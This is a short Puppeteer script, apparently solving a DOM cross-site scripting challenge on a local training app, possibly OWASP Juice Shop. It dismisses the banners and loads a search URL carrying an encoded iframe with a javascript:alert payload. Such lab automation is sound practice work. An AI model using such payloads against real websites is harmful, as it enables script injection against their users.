import puppeteer from 'https://deno.land/x/puppeteer@16.2.0/mod.ts';

const sleep = (seconds: number) =>
  new Promise((resolve) => setTimeout(resolve, seconds * 1000));

const browser = await puppeteer.launch({ headless: false });
const page = await browser.newPage();
page.setCookie(
  {
    url: 'http://localhost:3000',
    name: 'cookieconsent_status',
    value: 'dismiss',
  },
  {
    url: 'http://localhost:3000',
    name: 'welcomebanner_status',
    value: 'dismiss',
  }
);
await page.goto(
  'http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E'
);

await sleep(1000);

await browser.close();
